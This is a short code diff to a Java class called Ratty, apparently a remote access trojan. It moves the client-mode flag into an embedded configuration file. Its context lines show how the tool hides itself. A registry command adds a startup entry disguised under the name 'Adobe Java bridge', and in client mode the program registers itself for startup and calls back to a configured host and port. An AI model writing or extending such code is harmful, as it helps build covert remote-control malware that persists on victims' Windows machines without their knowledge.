@@ -19,6 +19,7 @@ public final class Ratty {
 	
 	private static String address;
 	private static int port;
+	private static boolean client;
 	
 	private static final int CONNECTION_INTERVAL = 2500;
 	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
@@ -29,7 +30,6 @@ public final class Ratty {
 	private static final String REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
 	
 	public static final String VERSION = "1.0";
-	public static final boolean CLIENT = false;
 	
 	private Ratty() {
 		//...
@@ -38,12 +38,14 @@ public final class Ratty {
 	private static void readConnectionData() {
 		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
 		
-		if (lines.length >= 2) {
+		if (lines.length >= 3) {
 			final String addressString = lines[0];
 			final String portString = lines[1];
+			final String clientString = lines[2];
 			
 			address = addressString;
 			port = Integer.parseInt(portString);
+			client = Boolean.parseBoolean(clientString);
 		}
 	}
 	
@@ -95,7 +97,7 @@ public final class Ratty {
 		WebLookAndFeel.install();
 		readConnectionData();
 		
-		if (CLIENT) {
+		if (client) {
 			addToStartup();
 			connectToHost(address, port);
 		} else {
